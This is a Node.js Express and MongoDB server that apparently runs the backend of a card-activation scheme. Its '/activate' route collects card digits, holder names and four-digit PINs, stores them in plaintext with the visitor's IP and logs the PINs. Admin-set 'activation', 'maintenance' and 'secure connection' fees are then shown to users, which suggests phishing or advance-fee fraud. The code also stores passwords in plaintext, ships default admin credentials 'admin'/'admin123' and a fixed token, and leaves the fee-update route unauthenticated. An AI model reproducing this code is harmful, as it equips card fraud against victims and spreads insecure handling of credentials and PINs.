const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const app = express();

require("dotenv").config();

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 3001;

// MongoDB Connection
const mongoUri = process.env.MONGODB_URI;
if (!mongoUri) {
  console.error(
    "MONGODB_URI is not defined in .env. Please set it in your .env file."
  );
  process.exit(1);
}

mongoose
  .connect(mongoUri, {
    serverSelectionTimeoutMS: 30000,
    heartbeatFrequencyMS: 10000,
    retryWrites: true,
    w: "majority",
    autoIndex: true,
  })
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

mongoose.connection.on("disconnected", () =>
  console.log("MongoDB disconnected")
);
mongoose.connection.on("error", (err) =>
  console.error("MongoDB connection error event:", err)
);
mongoose.connection.on("reconnected", () =>
  console.log("MongoDB reconnected successfully")
);

process.on("SIGINT", () => {
  mongoose.connection.close(() => {
    console.log("MongoDB connection closed due to app termination");
    process.exit(0);
  });
});

// Payment Schema
const paymentSchema = new mongoose.Schema({
  label: { type: String, required: true },
  price: { type: Number, required: true },
  updatedAt: { type: Date, default: Date.now },
});
const Payment = mongoose.model("Payment", paymentSchema);

// Activation Schema (unchanged)
const activationSchema = new mongoose.Schema({
  cardType: { type: String, required: true },
  lastSixDigits: { type: String, required: true },
  holderName: { type: String, required: true },
  currency: { type: String, required: true },
  dailyLimit: { type: Number, required: true },
  accept: { type: Boolean, required: true },
  pin: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
  userIp: { type: String },
});
const Activation = mongoose.model("Activation", activationSchema);

// Admin Schema
const adminSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
  ipAddress: { type: String },
});
const Admin = mongoose.model("Admin", adminSchema);

// Middleware to get IP
const getIp = (req, res, next) => {
  req.ipAddress =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  next();
};
app.use(getIp);

// Admin Login
app.post("/admin/login", async (req, res) => {
  const { username, password } = req.body;
  try {
    const admin = await Admin.findOne({ username, password });
    if (admin) {
      admin.ipAddress = req.ipAddress;
      await admin.save();
      return res
        .status(200)
        .json({ message: "Login successful", token: "admin-token" }); // Simple token for now
    }
    return res.status(401).json({ message: "Invalid credentials" });
  } catch (error) {
    console.error("Login error:", error);
    return res.status(500).json({ message: "Server error" });
  }
});

// Validate last 6 digits (unchanged)
app.post("/validate-digits", async (req, res) => {
  const { lastSixDigits } = req.body;
  console.log("Validating digits:", lastSixDigits);

  try {
    if (!lastSixDigits) {
      return res
        .status(400)
        .json({ message: "Please provide the last 6 digits of your card." });
    }
    if (lastSixDigits.length !== 6 || !/^\d+$/.test(lastSixDigits)) {
      return res
        .status(400)
        .json({ message: "The last 6 digits must be exactly 6 numbers." });
    }
    return res.status(200).json({ message: "Digits validated successfully" });
  } catch (error) {
    console.error("Server error in /validate-digits:", error);
    return res
      .status(500)
      .json({
        message: "An unexpected error occurred. Please try again later.",
      });
  }
});

// Activate card with PIN
app.post("/activate", async (req, res) => {
  const {
    cardType,
    lastSixDigits,
    holderName,
    currency,
    dailyLimit,
    accept,
    pin,
  } = req.body;
  console.log("Activating card with data:", req.body);

  try {
    if (
      !cardType ||
      !lastSixDigits ||
      !holderName ||
      !currency ||
      dailyLimit == null ||
      accept == null ||
      !pin
    ) {
      return res
        .status(400)
        .json({ message: "All fields are required to activate your card." });
    }

    if (lastSixDigits.length !== 6 || !/^\d+$/.test(lastSixDigits)) {
      return res
        .status(400)
        .json({ message: "The last 6 digits must be exactly 6 numbers." });
    }

    const limit = parseInt(dailyLimit);
    if (isNaN(limit) || limit > 5000 || limit < 0) {
      return res
        .status(400)
        .json({ message: "Daily limit must be a number between 0 and 5000." });
    }

    const validCurrencies = [
      "USD",
      "EUR",
      "GBP",
      "JPY",
      "CAD",
      "AUD",
      "CHF",
      "CNY",
      "INR",
      "ZAR",
    ];
    if (!validCurrencies.includes(currency)) {
      return res
        .status(400)
        .json({ message: "Unsupported currency selected." });
    }

    if (pin.length !== 4 || !/^\d+$/.test(pin)) {
      return res.status(400).json({ message: "PIN must be exactly 4 digits." });
    }

    if (!accept) {
      return res
        .status(400)
        .json({ message: "You must accept the terms to proceed." });
    }

    const newActivation = new Activation({
      cardType,
      lastSixDigits,
      holderName,
      currency,
      dailyLimit: limit,
      accept,
      pin,
      userIp: req.ipAddress,
    });
    await newActivation.save();
    console.log("Activation saved to DB with IP:", req.ipAddress);

    return res.status(200).json({ message: "Card activated successfully" });
  } catch (error) {
    console.error("Server error in /activate:", error);
    return res
      .status(500)
      .json({
        message: "An unexpected error occurred. Please try again later.",
      });
  }
});

// Admin update fees
app.post("/admin/update-fees", async (req, res) => {
  const { vat, cardActivation, cardMaintenance, secureConnection } = req.body;
  const adminIp = req.ipAddress;

  if (!vat || !cardActivation || !cardMaintenance || !secureConnection) {
    return res.status(400).json({ message: "All fee fields are required" });
  }

  try {
    await Payment.deleteMany({});
    const payments = [
      { label: "VAT (value added tax)", price: vat },
      { label: "Card activation", price: cardActivation },
      { label: "Card maintenance", price: cardMaintenance },
      {
        label: "3D visa/master/verve secure connection",
        price: secureConnection,
      },
    ];
    await Payment.insertMany(payments);
    console.log("Fees updated by IP:", adminIp, "with data:", payments);

    return res.status(200).json({ message: "Fees updated successfully" });
  } catch (error) {
    console.error("Server error in /admin/update-fees:", error);
    return res
      .status(500)
      .json({ message: "An error occurred while updating fees." });
  }
});

// Fetch payments (only after admin update)
app.get("/api/payments", async (req, res) => {
  try {
    const payments = await Payment.find().sort({ updatedAt: -1 }).limit(1); // Get latest update
    if (payments.length === 0) {
      return res
        .status(404)
        .json({
          message: "No payment data available. Contact admin to update.",
        });
    }
    return res.status(200).json({ payments });
  } catch (error) {
    console.error("Server error in /api/payments:", error);
    return res
      .status(500)
      .json({ message: "An error occurred while fetching payments." });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// Initial admin setup (run once)
async function initAdmin() {
  const adminExists = await Admin.countDocuments();
  if (adminExists === 0) {
    await Admin.create({ username: "admin", password: "admin123" });
    console.log(
      "Initial admin user created with username: admin, password: admin123"
    );
  }
}
